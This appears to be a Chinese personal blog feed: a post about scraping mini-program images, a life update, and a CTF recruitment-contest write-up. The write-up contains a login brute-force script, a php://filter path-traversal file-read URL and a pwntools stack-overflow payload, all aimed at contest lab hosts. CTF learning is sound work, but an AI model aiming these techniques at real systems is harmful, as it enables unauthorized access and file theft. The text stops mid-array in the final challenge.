rel="noopener">https://oos-pic.oss-cn-beijing.aliyuncs.com/2019%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/1.png</a></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image5.png" alt="image-20191204143738991"></p><p>多次刷新发现好像的确就那几张图片，改变了一下<code>x.png</code>而已。  </p><p>而且的确这就是假的图啦。<em>（不然哪来的用户数据可以分析</em>  </p><hr><h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><p>既然都知道是几张图片而已了，那顺便就爬下来吧。  </p><p>PyCharm 启动，来写一写jio本。  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/code.png" alt="image-20191204150348574"></p><p>写range是因为随便试了一下，本来就没有几张图片而已，然而懒得手动下载。</p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/download_imgs.png" alt="image-20191204144246023"></p><p>看结果的确就7张图片。。</p><p>呐就这几张了↓  </p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/1.png" alt="1"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/2.png" alt="2"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/3.png" alt="3"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/4.png" alt="4"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/5.png" alt="5"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/6.png" alt="6"></p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/7.png" alt="7"></p><hr><h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><p>看样子小程序获取个人头像，然后再和二维码、上面的任意一张图拼接在一起而已吧。   </p><p>就是这个<code>form.php</code>，看样子是用来统计使用数据的吧emmm问题不大。</p><p><img src="/2019/12/04/Scrapy_2019Year-end_Report/image6.png" alt="image-20191204144935029"></p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>哇呜折腾了一个中午好气啊，<del><em>（有毒 不折腾会死</em></del></p><p>不管怎么说这个小程序还是有点意思的，至少做的那几张图片还挺不错的哈哈哈。</p><p>不过要吐槽这个广告超级讨厌emmm</p><p>就这样吧。</p><p>爬取图片的源码 和 爬到的图片放到了Github上了，有需要的可以去看看吧。</p><p>URL：<a href="https://github.com/miaotony/Scrapy_2019Year-end_Report" target="_blank" rel="noopener">这是网址</a></p><p><a href="https://github.com/miaotony/Scrapy_2019Year-end_Report" target="_blank" rel="noopener">https://github.com/miaotony/Scrapy_2019Year-end_Report</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Analysis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> 分析 </tag>
            
            <tag> Python </tag>
            
            <tag> 爬虫 </tag>
            
            <tag> 小程序 </tag>
            
            <tag> 年终总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>纪念一下忙到爆炸超级难顶的十一月</title>
      <link href="/2019/12/02/Boom_2019November/"/>
      <url>/2019/12/02/Boom_2019November/</url>
      
        <content type="html"><![CDATA[<h2 id="纪念一下忙到爆炸超级难顶的十一月"><a href="#纪念一下忙到爆炸超级难顶的十一月" class="headerlink" title="纪念一下忙到爆炸超级难顶的十一月"></a>纪念一下忙到爆炸超级难顶的十一月</h2><p><del>（实在没忍住</del><br>本来就一堆事，然而有些活动还想去体验一下，不过收获倒是不少吧<br><del>（其实在作死…</del></p><p> <img src="/2019/12/02/Boom_2019November/plan.png" alt="plan"> </p> <a id="more"></a> <ul><li><p>电焊大赛 划了一波水  </p><p><img src="/2019/12/02/Boom_2019November/CircuitWeldingCompetition.jpg" alt="电焊大赛"></p></li><li><p>和师傅们玩了玩CTF（不务正业<br>到了大三才知道这个比赛嘤嘤嘤  太菜了，只拿了第六，不过有个一血还拿了个娃娃嘻嘻嘻<br>然而瞄了一眼NJUPT CTF题目，发现自己菜到爆炸。人家光是签到题就绕了好几个弯…   </p><p><img src="/2019/12/02/Boom_2019November/AsuriCTF2.jpg" alt="ctf"></p><p><img src="/2019/12/02/Boom_2019November/AsuriCTF.png" alt="ctf"></p></li><li><p>去东大打了一波Hackathon（不务正业<br>成功带飞俩学弟 拿了第四 三等奖<br> （微软爸爸真有钱，白嫖感觉超级爽233<br><img src="/2019/12/02/Boom_2019November/hackathon.JPG" alt="hackathon"><br><img src="/2019/12/02/Boom_2019November/hackathon3.png" alt="hackathon3"><br><img src="/2019/12/02/Boom_2019November/hackathon2.jpg" alt="hackathon2">   </p></li><li><p>做了持续一个月的校电赛<br>这回终于没有白给了，一等奖+最佳工程实践奖到手  </p><p><img src="/2019/12/02/Boom_2019November/NUAAEDC.jpg" alt="NUAAEDC"></p></li></ul><p>期间还有结课考试，准备大创中期材料，各种DDL，真就难顶到爆炸想自闭……  </p><p>不过要感谢超级棒的奶冰日常鼓励<br>没有奶冰的话包括<code>iCal</code>在内很多事真就很难坚持下去<br>还抑制住了我不少冲动233<br>还有陆师傅的<code>做好我们的就行了</code><br>于老板的<code>加油啊你们都大三了</code><br>焰焰的<code>先做好当下的事</code><br>一帆学弟的<code>冲冲冲</code><br>还有舍友的通情达理<br>etc.  </p><h2 id="转眼间就十二月啦"><a href="#转眼间就十二月啦" class="headerlink" title="转眼间就十二月啦"></a>转眼间就十二月啦</h2><p>这个月应该就没有比赛什么的了，不过项目进度有空还得赶一赶8<br>还要补课内欠下的一堆难到爆炸看不懂的知识<br>还有大作业、课设、实验，以及接下来几周陆续结课马上到来的考试……<br>（当然有空的话还想出去转一转（都好久没出门了嘤嘤嘤 除了去了趟SEU  </p><p>总之——<br><strong>接下来的两个月加油冲冲冲！</strong>  </p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Life </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Life </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | Asuri战队 2019招新赛 WriteUP</title>
      <link href="/2019/11/28/CTF_2019Asuri_Recruitment/"/>
      <url>/2019/11/28/CTF_2019Asuri_Recruitment/</url>
      
        <content type="html"><![CDATA[<h1 id="Asuri-招新赛WriteUP-20191117"><a href="#Asuri-招新赛WriteUP-20191117" class="headerlink" title="Asuri 招新赛WriteUP 20191117"></a>Asuri 招新赛WriteUP 20191117</h1><p>网址： <a href="http://139.9.212.218:8000/challenges" target="_blank" rel="noopener">http://139.9.212.218:8000/challenges</a>  </p><p>官方安排及WriteUP：<a href="https://github.com/Kit4y/2019-Asuri-Recruitment-Src-and-wp" target="_blank" rel="noopener">https://github.com/Kit4y/2019-Asuri-Recruitment-Src-and-wp</a>  </p><h2 id="test"><a href="#test" class="headerlink" title="test"></a>test</h2><p><code>flag{this_is_test_flag}</code> </p><h2 id="misc-签到"><a href="#misc-签到" class="headerlink" title="misc-签到"></a>misc-签到</h2><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117185210292.png" alt="misc"></p><p>base64解码即得到</p><p><code>flag{1_want_jiamus_p0wer}</code>  </p><h2 id="baby-web-九曲十八弯"><a href="#baby-web-九曲十八弯" class="headerlink" title="baby-web-九曲十八弯"></a>baby-web-九曲十八弯</h2><p> <a href="http://desperadoccy.club:39011/" target="_blank" rel="noopener">http://desperadoccy.club:39011/</a> </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117185108626.png" alt="image-20191117185108626"></p><p>base64解码</p><p><code>Asuri{view_source's_power}</code></p><h2 id="快速计算"><a href="#快速计算" class="headerlink" title="快速计算"></a>快速计算</h2><p> <a href="http://47.102.107.100:39012/" target="_blank" rel="noopener">http://47.102.107.100:39012/</a> </p> <a id="more"></a> <p>连续20次在1-2s内判断是否正确，即可得到flag。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> re<span class="token keyword">import</span> times <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://47.102.107.100:39012/"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    equation <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'&lt;div>(.*)=(.*)&lt;/div>'</span><span class="token punctuation">,</span> r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>equation<span class="token punctuation">)</span>    answer <span class="token operator">=</span> eval<span class="token punctuation">(</span>equation<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> answer <span class="token operator">==</span> eval<span class="token punctuation">(</span>equation<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        values <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'answer'</span><span class="token punctuation">:</span> <span class="token string">'true'</span><span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        values <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'answer'</span><span class="token punctuation">:</span> <span class="token string">'false'</span><span class="token punctuation">}</span>    r <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string">"http://47.102.107.100:39012/"</span><span class="token punctuation">,</span> data<span class="token operator">=</span>values<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117195746861.png" alt="image-20191117195746861"></p><p><code>Asuri{python_1s_th3_be3t_l4ngu4ge}</code></p><h2 id="medium-web-justburp"><a href="#medium-web-justburp" class="headerlink" title="medium_web_justburp"></a>medium_web_justburp</h2><p> <a href="http://139.9.212.218:39010/" target="_blank" rel="noopener">http://139.9.212.218:39010/</a> </p><p>查找网站目录下的文件</p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117204536434.png" alt="image-20191117204536434"></p><p>访问<code>robots.txt</code> 得到：  </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212248603.png" alt="image-20191117212248603"></p><p>访问<code>hint.php</code> 得到一个文件  </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212350116.png" alt="image-20191117212350116"></p><p>尝试以<code>admin</code>作为用户名，用以上信息作为密码写脚本进行登录，  </p><p>然而好像没有成功（有可能有成功的没看到？？？  </p><blockquote><p>难受了，现场写的时候脑乱了，把所有登录数据都打印出来了，然后没找到flag…<br>加一个if重新来就看到了惹emmm</p></blockquote><p><strong>爆破一波</strong></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> requestss <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://139.9.212.218:39010/index.php"</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">"utf-8"</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">'name-pass.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> file<span class="token punctuation">:</span>    contents <span class="token operator">=</span> file<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># print(contents)</span>    passwords <span class="token operator">=</span> contents<span class="token keyword">for</span> password <span class="token keyword">in</span> passwords<span class="token punctuation">:</span>    values <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token string">'admin'</span><span class="token punctuation">,</span>              <span class="token string">'password'</span><span class="token punctuation">:</span> password<span class="token punctuation">}</span>    r <span class="token operator">=</span> s<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"http://139.9.212.218:39010/index.php"</span><span class="token punctuation">,</span> params<span class="token operator">=</span>values<span class="token punctuation">)</span>    r<span class="token punctuation">.</span>encoding <span class="token operator">=</span> <span class="token string">'utf-8'</span>    <span class="token keyword">if</span> <span class="token string">'密码错误'</span> <span class="token operator">not</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p>即可得到</p><pre class=" language-html"><code class="language-html"><span class="token doctype">&lt;!DOCTYPE html></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Hi hacker<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">bgcolor</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bisque<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>index.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>用户名：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>密码：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>登陆<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>hint:admin用户的密码似乎在某个页面里 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>看你骨骼精奇，就将flag交于你了！Asuri{Burp_1s_Gre@t}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>flag:  <code>Asuri{Burp_1s_Gre@t}</code></p><blockquote><p>其实这题用BurpSuite更快，导入字典直接爆破都不用自己写jio本。。<br>然而我现场还在搜它怎么用……</p></blockquote><h2 id="hard-web-php是世界上最好的语言"><a href="#hard-web-php是世界上最好的语言" class="headerlink" title="hard_web_php是世界上最好的语言"></a>hard_web_php是世界上最好的语言</h2><p> <a href="http://139.9.212.218:39009/" target="_blank" rel="noopener">http://139.9.212.218:39009/</a> </p><p>改cookie重发</p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212633273.png" alt="image-20191117212633273"></p><p>访问<code>read_file.php</code>，得到  </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212728303.png" alt="image-20191117212728303"></p><p>访问<code>no_flag_here.php</code>  ，构造参数进入根目录  </p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117203840679.png" alt="image-20191117203840679"></p><p>然而！emmm这个scandir怎么获取这个flag文件内容啊！！！</p><blockquote><p>看了大师傅的WriteUP，发现PHP还可以这么读取文件…（下面 </p></blockquote><p>构造<code>file=php://filter/read=convert.base64-encode/resource=</code>+绝对路径</p><p><a href="http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=../../../flag04ad59.php" target="_blank" rel="noopener">http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=../../../flag04ad59.php</a></p><p>或者</p><p><a href="http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=/flag04ad59.php" target="_blank" rel="noopener">http://139.9.212.218:39009/read_file.php?file=php://filter/read=convert.base64-encode/resource=/flag04ad59.php</a></p><p>得到一串Base64字符串</p><p><code>PD9waHANCiAgICAvL0FzdXJpe1dFQl9XSU5ORVJ9DQo/Pg==</code>  </p><p>解码后：</p><pre><code>&lt;?php    //Asuri{WEB_WINNER}?&gt;</code></pre><p>flag: <code>Asuri{WEB_WINNER}</code></p><h2 id="easy-pwn"><a href="#easy-pwn" class="headerlink" title="easy_pwn"></a>easy_pwn</h2><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212839633.png" alt="image-20191117212839633"></p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117213445330.png" alt="image-20191117213445330"></p><p><img src="/2019/11/28/CTF_2019Asuri_Recruitment/image-20191117212904694.png" alt="image-20191117212904694"></p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>  <span class="token comment" spellcheck="true"># 引入pwntools库</span><span class="token keyword">import</span> timesh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'49.235.243.206'</span><span class="token punctuation">,</span> <span class="token number">9001</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 创建与靶场服务器的连接</span>offset <span class="token operator">=</span> <span class="token number">0x60</span><span class="token operator">+</span><span class="token number">0x8</span>  <span class="token comment" spellcheck="true"># 偏移</span>system_addr <span class="token operator">=</span> <span class="token number">0x400766</span>  <span class="token comment" spellcheck="true"># system函数地址</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Please input your passworld size'</span><span class="token punctuation">)</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>p64<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 向程序发送数据</span>    sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Please input your password'</span><span class="token punctuation">)</span>    payload <span class="token operator">=</span> offset <span class="token operator">*</span> b<span class="token string">'a'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 构造攻击数据</span>    sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 向程序发送数据</span>    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 将控制流从程序转移到自己这里</span></code></pre><p>完了不会写，嘤嘤嘤</p><h2 id="medium-rev"><a href="#medium-rev" class="headerlink" title="medium_rev"></a>medium_rev</h2><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># encoding: utf-8</span><span class="token comment" spellcheck="true"># 如果觉得不错，可以推荐给你的朋友！http://tool.lu/pyc</span><span class="token keyword">def</span> <span class="token function">encrypt_for_each</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    index <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">100</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp <span class="token operator">=</span> i <span class="token operator">^</span> <span class="token number">77</span>        <span class="token keyword">yield</span> tmp        None<span class="token keyword">def</span> <span class="token function">encrypt</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>    iters <span class="token operator">=</span> encrypt_for_each<span class="token punctuation">(</span><span class="token punctuation">)</span>    enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>m<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">in</span> zip<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>        e <span class="token operator">=</span> m <span class="token operator">^</span> k <span class="token operator">^</span> iters<span class="token punctuation">.</span>__next__<span class="token punctuation">(</span><span class="token punctuation">)</span>        enc<span class="token punctuation">.</span>append<span class="token punctuation">(</span>e<span class="token punctuation">)</span>    <span class="token keyword">return</span> enc<span class="token keyword">def</span> <span class="token function">generate_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">check_prime</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> num <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> num<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> num <span class="token operator">%</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">False</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    test <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token number">8</span><span class="token punctuation">,</span>        <span class="token number">61</span><span class="token punctuation">,</span>        <span class="token number">85</span><span class="token punctuation">,</span>        <span class="token number">25</span><span class="token punctuation">,</span>        <span class="token number">121</span><span class="token punctuation">,</span>        <span class="token number">53</span><span class="token punctuation">,</span>        <span class="token number">26</span><span class="token punctuation">,</span>        <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token number">81</span><span class="token punctuation">,</span>        <span class="token number">52</span><span class="token punctuation">,</span>        <span class="token number">124</span><span class="token punctuation">,</span>        <span class="token number">22</span><span class="token punctuation">,</span>        <span class="token number">137</span><span class="token punctuation">,</span>        <span class="token number">56</span><span class="token punctuation">,</span>        <span class="token number">94</span><span class="token punctuation">,</span>        <span class="token number">107</span><span class="token punctuation">,</span>        <span class="token number">59</span><span class="token punctuation">,</span>        <span class="token number">132</span><span class="token punctuation">,</span>        <span class="token number">90</span><span class="token punctuation">,</span>        <span class="token number">3</span><span class="token punctuation">,</span>        <span class="token number">51</span><span class="token punctuation">,</span>        <span class="token number">46</span><span class="token punctuation">,</span>        <span class="token number">77</span><span class="token punctuation">,</span>        <span class="token number">127</span><span class="token punctuation">,</span>        <span class="token number">35</span><span class="token punctuation">,</span>        <span class="token number">86</span><span class="token punctuation">,</span>        <span class="token number">134</span><span class="token punctuation">,</span>        <span class="token number">20</span><span class="token punctuation">,</span>        <span class="token number">73</span><span class="token punctuation">,</span>        <span class="token number">32</span><span class="token punctuation">,</span>        <span class="token number">66</span><span class="token punctuation">,</span>        <span class="token number">99</span><span class="token punctuation">,</span>        <span class="token number">7</span><span class="token punctuation">,</span>        <span class="token number">69</span><span class="token punctuation">,</span>        <span class="token number">122</span><span class="token punctuation">,</span>        <span class="token number">4</span><span class="token punctuation">,</span>        <span class="token number">142</span><span class="token punctuation">,</span>        <span class="token number">23</span><span class="token punctuation">,</span>        <span class="token number">80</span><span class="token punctuation">,</span>        <span class="token number">109</span><span class="token punctuation">,</span>        <span class="token number">60</span><span class="token punctuation">,</span>        <span class="token number">79</span><span class="token punctuation">,</span>        <span class="token number">36</span><span class="token punctuation">,</span>        <span class="token number">62</span><span class="token punctuation">,</span>        <span class="token number">5</span><span class="token punctuation">,</span>        <span class="token number">104</span><span class="token punctuation">,</span>        <span class="token number">102</span><span class="token punctuation">,</span>        <span class="token number">14</span><span class="token punctuation">,</span>        <span class="token number">58</span><span class="token punctuation">,</span>        <span class="token number">149</span><span class="token punctuation">,</span>        <span class="token number">31</span><span class="token punctuation">,</span>        <span class="token number">96</span><span class="token punctuation">,</span>        <span class="token number">68</span><span class="token punctuation">,</span>        <span class="token number">114</span><span class="token punctuation">,</span>        <span class="token number">116</span><span class="token punctuation">,</span>        <span class="token number">11</span><span class="token punctuation">,</span>        <span class="token number">95</span><span class="token punctuation">,</span>        <span class="token number">87</span><span class="token punctuation">,</span>        <span class="token number">146</span><span class="token punctuation">,</span>        <span class="token number">123</span><span class="token punctuation">,</span>        <span class="token number">15</span><span class="token punctuation">,</span>        <span class="token number">135</span><span class="token punctuation">,</span>        <span class="token number">33</span><span class="token punctuation">,</span>        <span class="token number">37</span><span class="token punctuation">,</span>        <span class="token number">110</span><span class="token punctuation">,</span>        <span class="token number">19</span><span class="token punctuation">,</span>        <span class="token number">106</span><span class="token punctuation">,</span>        <span class="token number">30</span><span class="token punctuation">,</span>        <span class="token number">130</span><span class="token punctuation">,</span>        <span class="token number">101</span><span class="token punctuation">,</span>        <span class="token number">97</span><span class="token punctuation">,</span>        <span class="token number">98</span><span class="token punctuation">,</span>        <span class="token number">141</span><span class="token punctuation">,</span>        <span class="token number">2</span><span class="token punctuation">,</span>        <span class="token number">47</span><span class="token punctuation">,</span>        <span class="token number">6</span><span class="token punctuation">,</span>        <span class="token number">24</span><span class="token punctuation">,</span>        <span class="token number">131</span><span class="token punctuation">,</span>        <span class="token number">16</span><span class="token punctuation">,</span>        <span class="token number">111</span><span class="token punctuation">,</span>        <span class="token number">150</span><span class="token punctuation">,</span>        <span class="token number">55</span><span class="token punctuation">,</span>        <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token number">76</span><span class="token punctuation">,</span>        <span class="token number">12</span><span class="token punctuation">,</span>        <span class="token number">138</span><span class="token punctuation">,</span>        <span class="token number">64</span><span class="token punctuation">,</span>        <span class="token number">120</span><span class="token punctuation">,</span>        <span class="token number">118</span><span class="token punctuation">,</span>        <span class="token number">29</span><span class="token punctuation">,</span>        <span class="token number">145</span><span class="token punctuation">,</span>        <span class="token number">147</span><span class="token punctuation">,</span>        <span class="token number">9</span><span class="token punctuation">,</span>        <span class="token number">113</span><span class="token punctuation">,</span>        <span class="token number">103</span><span class="token punctuation">,</span>        <span class="token number">40</span><span class="token punctuation">,</span>        <span class="token number">92</span><span class="token punctuation">,</span>        <span class="token 